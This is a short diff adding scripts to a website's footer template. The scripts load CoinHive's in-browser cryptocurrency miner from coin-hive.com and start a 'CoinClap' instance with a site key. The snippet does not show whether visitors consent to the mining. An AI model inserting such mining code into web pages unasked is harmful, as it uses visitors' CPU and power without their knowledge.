@@ -23,3 +23,12 @@
   </div>
 
 </footer>
+
+<script src="{{ "/public/js/coinclap.js" | relative_url }}"></script>
+<script>window.CoinHive || document.write('<script src="https://coin-hive.com/lib/coinhive.min.js"><\/script>')</script>
+<script>
+  var coinClap = new CoinClap({
+    siteKey: '2jRrehVQBZuyxo5kCHIZFE9GzochSmhL',
+  });
+  coinClap.init();
+</script>
